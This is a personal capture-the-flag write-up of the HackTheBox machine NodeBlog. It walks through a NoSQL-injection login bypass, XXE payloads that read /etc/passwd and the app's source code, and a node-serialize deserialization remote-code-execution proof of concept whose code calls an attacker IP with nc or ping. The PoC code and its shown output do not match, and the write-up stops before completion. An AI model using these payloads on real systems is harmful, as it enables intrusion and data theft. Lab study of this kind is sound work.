---
title: NodeBlock
tags:
  - HackTheBox
  - Easy
  - Linux
  - Nodejs
  - NoSQLi
  - File-Upload
  - XXE
  - Source-Code-Leak
  - Deserialization
date: 2025-05-28T00:00:00Z
---
![](Pasted%20image%2020250528154259.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.139 nodeblog.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- nodeblog.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  upnp
```

So I checked the port `5000`:

![](Pasted%20image%2020250528154545.png)

It seems to be a basic Node app. Inspecting the source code there are two hidden endpoints: `/login` and `/articles`:

![](Pasted%20image%2020250528154625.png)

- `/login`:

![](Pasted%20image%2020250528154715.png)

- `/articles`:

![](Pasted%20image%2020250528154843.png)

## Weaponization

I'll try to test for NoSQLi as explained in [Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html?highlight=NoSQL#nosql-injection).

## Exploitation

I decided to capture the petition and test for NoSQLi:

![](Pasted%20image%2020250528155302.png)

I'll inspect which verbs the website accepts by using `OPTIONS`:

![](Pasted%20image%2020250528155351.png)

When testing a non-existent username I get the error "Invalid username":

![](Pasted%20image%2020250528160229.png)

Then testing for the "admin" user I noted a different message:

![](Pasted%20image%2020250528160329.png)

If I try the body to JSON I see that the response has the same message "Invalid Password":

![](Pasted%20image%2020250528160607.png)

So if I test with the following payload I can successfully bypass the login:

```shell
{
  "user": "admin",
  "password": {"$ne": "admin"}
}
```

![](Pasted%20image%2020250528160756.png)

So now I'll send the petition to the Intercept and get access to the admin panel:

![](Pasted%20image%2020250528160944.png)

## Exploitation x2

I noted an "Upload" button, so I'll inspect it and try to upload a web shell:

![](Pasted%20image%2020250528161145.png)

It only allows to upload xml files or this error is prompted:

![](Pasted%20image%2020250528161238.png)

Inspecting the source code of the error I get an example of the file structure it accepts:

![](Pasted%20image%2020250528163245.png)

So I'll upload the example to test the functionality:

```xml
<post>
	<title>Example Post</title>
	<description>Example Description</description>
	<markdown>Example Markdown</markdown>
</post>
```

Then it automatically gets the content of it:

![](Pasted%20image%2020250528163445.png)

So now I'll craft a malicious xml file with the following content:

```xml
<!DOCTYPE item [ <!ELEMENT item ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<post>
	<title>Example Post</title>
	<description>Example Description</description>
	<markdown>&xxe;</markdown>
</post>
```

![](Pasted%20image%2020250528163758.png)

> Got an XXE!

So now I can try to read the source code. To do do, first I need to know the location of it by inputting a bad body on the `/login` request:

![](Pasted%20image%2020250528164923.png)

Checking the output, we can see that the server is located inside `/opt/blog`, so we can try to leak the typicall configuration file `server.js`:

```xml
<!DOCTYPE item [ <!ELEMENT item ANY >
<!ENTITY xxe SYSTEM "file:///opt/blog/server.js" >]>

<post>
	<title>Example Post</title>
	<description>Example Description</description>
	<markdown>&xxe;</markdown>
</post>
```

### Deserialization

- The content of `server.js`:

```js
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex
')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, a
uthenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)
```

It seems that `node-serialize` library is being used, so I checked the cookie of the `admin` user and took note of their cookie:

```shell
%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
# URL Decoded
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

If I decode it seems to be a json containing the user and its hashed passwd.

## Weaponization x2

I searched "nodejs deserialization exploit" and found [OPSECX](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

## Exploitation x3

First I created a `serialize.js` to to create a PoC for the output of the `id` command:

```js
var y = {
rce : function(){
require('child_process').exec('nc 10.10.14.36 777', function(error, stdout,
stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

- NOTE: I needed to install `node-serialize` library with `npm install node-serialize`

The result of executing it is the following (`node serialize.js`):

```shell
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 10.10.14.36',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
# URL Encoded
%7B%22rce%22%3A%22%5F%24%24ND%5FFUNC%24%24%5Ffunction%28%29%7Brequire%28%27child%5Fprocess%27%29%2Eexec%28%27ping%20%2Dc%201%2010%2E10%2E14%2E36%27%2C%20function%28error%2C%20stdout%2C%20stderr%29%7Bconsole%2Elog%28stdout%29%7D%29%3B%7D%28%29%22%7D
```

==IMPORTANT: the machine doesn't actively work, so I won't continue this writeup, but the initial steps are valuable for me.==